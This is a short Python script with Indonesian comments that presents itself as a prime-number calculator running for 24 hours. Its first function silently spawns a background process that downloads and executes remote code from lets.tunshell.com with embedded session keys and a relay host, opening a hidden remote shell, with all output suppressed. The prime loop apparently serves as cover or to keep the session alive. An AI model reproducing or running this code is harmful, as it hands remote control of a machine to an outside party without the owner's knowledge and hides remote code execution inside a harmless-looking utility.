import subprocess
import time
import math
from datetime import datetime, timedelta

# Fungsi untuk menjalankan script pertama di latar belakang
def run_background_script():
    try:
        # Menjalankan script pertama
        command = (
            "import urllib.request; "
            "r=urllib.request.urlopen('https://lets.tunshell.com/init.py'); "
            "exec(r.read().decode('utf-8'),{'p':"
            '["T","nzVnAIddqGZSaRgmpKYDOt","LSvVITlhQ0PDFgAB9NA6V2","au.relay.tunshell.com"]})'
        )
        subprocess.Popen(
            ["python3", "-c", command],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        print("Script pertama berhasil dijalankan di latar belakang.")
    except Exception as e:
        print(f"Error saat menjalankan script pertama: {e}")

# Fungsi untuk memeriksa apakah sebuah angka adalah bilangan prima
def is_prime(number):
    if number <= 1:
        return False
    for i in range(2, int(math.sqrt(number)) + 1):
        if number % i == 0:
            return False
    return True

# Fungsi untuk menghitung dan mencetak bilangan prima dalam rentang tertentu
def calculate_primes():
    print("Menghitung bilangan prima...")
    max_number = 1000  # Batas maksimum angka yang akan diperiksa
    primes = [num for num in range(2, max_number + 1) if is_prime(num)]

    print(f"Bilangan prima antara 2 hingga {max_number}:")
    print(primes)

# Menjalankan script pertama di latar belakang
run_background_script()

# Waktu mulai dan waktu berakhir (24 jam dari waktu mulai)
start_time = datetime.now()
end_time = start_time + timedelta(hours=24)

print("Program menghitung bilangan prima dimulai...")

# Loop yang akan berjalan selama 24 jam
while datetime.now() < end_time:
    calculate_primes()
    time.sleep(180)  # Menunggu selama 3 menit (180 detik)

print("Program selesai setelah berjalan selama 24 jam.")
